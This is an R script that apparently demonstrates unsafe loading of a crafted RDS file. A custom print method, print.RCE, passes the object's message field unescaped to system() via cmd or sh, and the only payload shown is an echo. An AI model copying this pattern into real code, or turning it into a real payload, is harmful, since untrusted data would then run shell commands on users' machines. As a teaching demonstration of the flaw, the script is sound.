# 2018-compatible, Windows/POSIX safe
# WARNING: Loading/printing this crafted RDS triggers a benign side effect.

# --- make working dir = script folder ---
args <- commandArgs(trailingOnly = FALSE)
file_arg <- grep("^--file=", args, value = TRUE)
if (length(file_arg)) {
  script_path <- normalizePath(sub("^--file=", "", file_arg))
  script_dir  <- dirname(script_path)
  setwd(script_dir)
}

# S3 print method that performs a benign side-effect (echo)
print.RCE <- function(x, ...) {
  msg <- x$msg
  if (.Platform$OS.type == "windows") {
    system(paste("cmd /c echo", msg), invisible = TRUE)
  } else {
    system(paste("sh -c \"echo", msg, "\""), invisible = TRUE)
  }
  invisible(0L)
}

# Load and demonstrate unsafe behavior when printing untrusted objects
obj <- readRDS("artifacts/malicious.rds")
res <- print(obj)  # Triggers side-effect via print.RCE

cat("Loaded object class:", paste(class(obj), collapse = ","), "\n")
cat("Print returned:", res, "\n")
